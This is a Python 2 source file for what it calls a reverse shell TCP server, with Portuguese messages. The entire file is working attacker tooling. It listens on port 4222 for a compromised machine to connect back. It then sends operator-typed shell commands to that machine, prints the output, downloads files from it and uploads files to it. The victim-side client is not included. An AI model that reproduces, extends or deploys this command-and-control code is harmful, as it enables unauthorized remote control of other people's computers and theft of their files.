# -*- coding: cp1252 -*-
import socket,os,sys,threading
def download(conn,command):
    arq = "server_file.py"
    f = open(arq,'wb')
    while True:  
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print ('[-] Unable to find out the file')
            break
        if bits.endswith('DONE'):
            print ('[+] Download Completo ')
            f.close()
            break
        f.write(bits)
# Old Shell for command execution


def mandaArq(s,path):
 try:    
    caminho = str(os.getcwd())+'\\'+path
    s.send('mandaArq %s'%path)
    if os.path.exists(caminho):
        print('Enviando arquivo %s ...'%path)
        f = open(caminho, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()     

 except:
     print('[-] Arquivo %s não encontrado '%path)
     
def banner():
   print('#######################################################################################################\n\n')
   print('RFS Reverse Shell TCP SERVER V1')
   print('#######################################################################################################\n\n')

def connect():
    ip = ''
    port = 4222
    try:
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.bind((ip,port))
     s.listen(5)
     print('Listening at port: '+str(port))
     conn,addr = s.accept()
     print('[+] User connected : ',addr)

     while True:
        command = str(raw_input("CMD# >"))
        if 'quit' in command:
            conn.send('quit')
            conn.close()
            break
        
        elif 'download' in command:
            conn.send(command)
            resposta = conn.recv(1024)
            download(conn,command )

        elif 'mandaArq' in command:
            mand = command[9:]
            mandaArq(conn,mand)
            print(conn.recv(1024))
            
        else:
            conn.send(command)
            resposta = conn.recv(4096)
            if 'quit' in resposta:
                conn.close()
                break
            print(resposta)
    except:
        e = sys.exc_info()[0]
        print('[server]Erro ao se conectar \n [-]Erro S3RV3R : \n %s'%str(e))

def main():  
    client_handler = threading.Thread(target=connect,args=())
    client_handler.start()
    
banner()
main()
    
